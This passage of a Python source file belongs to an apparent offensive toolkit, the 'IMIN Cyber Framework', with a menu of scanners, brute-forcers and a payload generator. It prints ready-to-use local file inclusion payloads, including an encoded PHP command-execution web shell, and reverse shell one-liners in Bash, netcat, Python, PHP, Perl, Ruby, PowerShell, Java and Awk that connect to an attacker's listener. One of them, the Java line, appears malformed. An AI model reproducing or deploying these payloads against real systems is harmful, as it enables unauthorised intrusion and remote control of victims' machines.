        """Generate LFI payloads."""
        print(f"\n{Color.NEON_CYAN}LFI Payloads:{Color.NC}\n")

        payloads = [
            ("Linux /etc/passwd", "../../../../etc/passwd"),
            ("Linux (double dot)", "....//....//....//etc/passwd"),
            ("Windows Hosts", "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"),
            ("Windows (forward)", "../../../../windows/system32/drivers/etc/hosts"),
            ("PHP Filter", "php://filter/convert.base64-encode/resource=index.php"),
            ("PHP Filter #2", "php://filter/read=convert.base64-encode/resource=../../etc/passwd"),
            ("Data URI", "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+"),
            ("Input Wrapper", "php://input"),
            ("Expect Wrapper", "expect://id"),
            ("Null Byte (old)", "../../../../etc/passwd%00"),
        ]

        for i, (name, payload) in enumerate(payloads, 1):
            print(f"  {Color.NEON_GREEN}[{i}]{Color.NC} {Color.BOLD}{name:<20}{Color.NC} {Color.DIM}{payload}{Color.NC}")

        self.report.info(f"Generated {len(payloads)} LFI payloads")

    def _reverse_shell(self) -> None:
        """Generate reverse shell payloads."""
        ip = input(f"{Color.p_question('Enter your listener IP: ')}")
        port = input(f"{Color.p_question('Enter your listener port: ')}")

        print(f"\n{Color.NEON_CYAN}Reverse Shell Payloads:{Color.NC}\n")

        shells = [
            ("Bash", f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"),
            ("Netcat", f"nc -e /bin/sh {ip} {port}"),
            ("Python", f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"),
            ("PHP", f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"),
            ("Perl", f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"),
            ("Ruby", f"ruby -rsocket -e 'c=TCPSocket.new(\"{ip}\",{port});while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}};end'"),
            ("PowerShell#1", f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{ip}\",{port});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{{0}};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){{;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1 | Out-String );$sendback2=$sendback+\"PS \"+(pwd).Path+\"> \";$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"),
            ("PowerShell#2", f"powershell -c \"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\""),
            ("Java", f"Runtime.getRuntime().exec(\"/bin/bash -c '$@|sh 0 echo echo YmFzaCAtaSA+JiAvZGV2L3RjcC97aXB9L3twb3J0fSAwPiYx'|base64 -d|bash -i\")"),
            ("Awk", f"awk 'BEGIN{{s=\"/inet/tcp/0/{ip}/{port}\";while(42|getline c){{while(c|getline){{if($0)print $0|s;print $0|s}}close(c)}}{{{exit}}}'"),
        ]

        for i, (name, payload) in enumerate(shells, 1):
            print(f"  {Color.NEON_GREEN}[{i}]{Color.NC} {Color.BOLD}{name:<15}{Color.NC}")
            print(f"      {Color.Y}{payload}{Color.NC}\n")

        self.report.info(f"Generated {len(shells)} reverse shell payloads")


# ============================================================================
# MAIN APPLICATION
# ============================================================================

class IminCyberFramework:
    """Main application controller."""

    VERSION = "3.0 PRO EDITION"

    def __init__(self):
        self.report = Report()

        # Initialize modules
        self.modules = {
            "1": ("Network Scan", NetworkScanner),
            "2": ("Web Scanner", WebScanner),
            "3": ("Vulnerability Scanner", VulnerabilityScanner),
            "4": ("User Finder (OSINT)", UserFinder),
            "5": ("Directory Bruteforcer", DirectoryBruteforcer),
            "6": ("Port Scanner", PortScanner),
            "7": ("DNS Scanner", DNSScanner),
            "8": ("Subdomain Scanner", SubdomainScanner),
            "9": ("Hash Tools", HashTools),
            "10": ("Payload Generator", PayloadGenerator),
            "11": ("Save Report", None),
            "12": ("Change Banner", None),
            "13": ("Exit", None),
        }

    def show_menu(self) -> None:
        """Display the main menu."""
        print(f"\n{Color.NEON_PURPLE}{'═' * 62}{Color.NC}")
        print(f"  {Color.BOLD}{Color.NEON_CYAN}MAIN MENU — SELECT MODULE{Color.NC}")
        print(f"{Color.NEON_PURPLE}{'═' * 62}{Color.NC}\n")

        for key, (name, _) in sorted(self.modules.items(), key=lambda x: int(x[0]) if x[0].isdigit() else 99):
            # Color by category
            if key in ["1", "2", "3"]:
                color = Color.NEON_RED
            elif key in ["4", "5", "6", "7", "8"]:
                color = Color.NEON_GREEN
            elif key in ["9", "10"]:
                color = Color.NEON_PURPLE
            elif key == "11":
                color = Color.NEON_YELLOW
            elif key == "12":
                color = Color.NEON_BLUE
            elif key == "13":
                color = Color.R
            else:
                color = Color.W

            icon = {
                "1": "🌐", "2": "🌍", "3": "💉", "4": "🔍",
                "5": "📂", "6": "🔌", "7": "📡", "8": "🌐",
                "9": "🔑", "10": "💣", "11": "📊", "12": "🖼️",
                "13": "🚪"
            }.get(key, "•")

            num_pad = key.zfill(2)
            print(f"    {color}{icon}{Color.NC} [{Color.B}{num_pad}{Color.NC}] {name}")

        print(f"\n{Color.NEON_PURPLE}{'═' * 62}{Color.NC}")

        # Stats
        findings_count = len(self.report.findings)
        if findings_count:
            print(f"\n  {Color.DIM}Active session findings: {Color.NEON_YELLOW}{findings_count}{Color.NC}")

        print(f"  {Color.DIM}Total scan time: {(datetime.now() - self.report.start_time).total_seconds():.1f}s{Color.NC}")

    def run_module(self, module_id: str) -> None:
        """Run a selected module."""
        if module_id not in self.modules:
            print(f"\n{Color.p_error('Invalid option')}")
            return

        name, module_class = self.modules[module_id]

        if module_id == "11":
            self.report.save()
            return

        if module_id == "12":
            self._change_banner()
            return

        if module_id == "13":
            if self.report.findings:
                save = input(f"\n{Color.p_question('Save report before exiting? (y/n): ')}").lower()
                if save == 'y':
                    self.report.save()
            print(f"\n{Color.NEON_RED}Exiting IMIN Cyber Framework...{Color.NC}")
            print(f"{Color.DIM}Stay secure. Stay dangerous.{Color.NC}\n")
            sys.exit(0)

        # Run the module
        print(f"\n{Color.NEON_GREEN}{'━' * 62}{Color.NC}")
        print(f"  {Color.BOLD}Module: {Color.NEON_CYAN}{name}{Color.NC}")
        print(f"{Color.NEON_GREEN}{'━' * 62}{Color.NC}")

        try:
            module = module_class(self.report)
            module.run()
        except KeyboardInterrupt:
            print(f"\n\n{Color.Y}Module interrupted by user{Color.NC}")
        except Exception as e:
            print(f"\n{Color.p_error(f'Module error: {e}')}")

    def _change_banner(self) -> None:
        """Change the display banner."""
        print(f"\n{Color.NEON_CYAN}Available Banners:{Color.NC}")
        print(f"  {Color.B}[1]{Color.NC} Cyber Skull (default)")
        print(f"  {Color.B}[2]{Color.NC} Matrix Style")
        print(f"  {Color.B}[3]{Color.NC} Dragon Eye")

        choice = input(f"\n{Color.p_question('Select banner [1-3]: ')}")
        if choice in BANNER_CHOICES:
            print_banner(choice)
            self.report.success(f"Banner changed to style {choice}")
        else:
            self.report.warning("Invalid banner choice")

    def run(self) -> None:
        """Main application loop."""
        current_banner = "1"

        while True:
            print_banner(current_banner)
            self.show_menu()

            choice = input(f"\n{Color.p_question('Enter option: ')}").strip()

            if choice == "13":
                self.run_module("13")

            self.run_module(choice)

            if choice != "12":
                input(f"\n{Color.DIM}Press Enter to continue...{Color.NC}")


# ============================================================================
# ENTRY POINT
# ============================================================================

if __name__ == "__main__":
    try:
        # Check for root/admin
        if os.name != 'nt' and os.geteuid() == 0:
            print(f"\n{Color.Y}⚠ Running as root — some features may have elevated access{Color.NC}")
            time.sleep(1)

        app = IminCyberFramework()
        app.run()

    except KeyboardInterrupt:
        print(f"\n\n{Color.NEON_RED}Interrupted by user.{Color.NC}")
        print(f"{Color.DIM}Stay secure. Stay dangerous.{Color.NC}\n")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Color.R}Fatal error: {e}{Color.NC}")
        sys.exit(1)